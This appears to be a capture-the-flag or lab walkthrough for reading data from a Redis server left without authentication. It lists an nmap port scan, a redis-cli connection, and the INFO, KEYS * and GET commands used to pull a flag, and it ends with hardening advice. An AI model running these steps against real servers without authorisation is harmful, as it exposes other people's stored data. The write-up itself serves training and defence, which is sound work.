# Redis — unauthenticated access (walkthrough)

**Redis** without **ACL** / `requirepass` (older deployments) allows any client to read and write the keyspace. This is a **critical** finding on internet-facing hosts.

---

## 1. Port scan

```bash
nmap -sV -p- <target-ip>
```

| Flag | Purpose |
|------|---------|
| `-p-` | All TCP ports (Redis may be moved off **6379**) |
| `-sV` | Confirm `redis` service string |

Replace `<target-ip>` with the lab host.

---

## 2. Connect with `redis-cli`

```bash
redis-cli -h <target-ip> -p 6379
```

Add `-p` if the instance is non-default.

**Server metadata:**

```text
INFO
```

Useful sections include `Server`, `Replication`, and `Persistence` (RDB/AOF paths sometimes reveal usernames/paths).

---

## 3. Enumerate keys

```text
KEYS *
```

**Warning:** `KEYS *` is **O(N)** and blocks large production databases—in labs it is usually acceptable.

---

## 4. Read a value

```text
GET flag
```

Replace `flag` with the key name observed in `KEYS` output.

---

## Summary

| Step | Command | Purpose |
|------|---------|---------|
| Scan | `nmap -sV -p- <target-ip>` | Locate Redis port |
| Client | `redis-cli -h <target-ip>` | Interactive session |
| Meta | `INFO` | Version / config hints |
| Keys | `KEYS *` | Inventory key names |
| Data | `GET <key>` | Read stored value |

---

## Mitigations (real world)

- Enable **Redis ACLs** / `requirepass`, bind to **localhost** or a management VLAN, and disable dangerous commands via **`rename-command`** where appropriate.

**Status:** lab objectives completed.
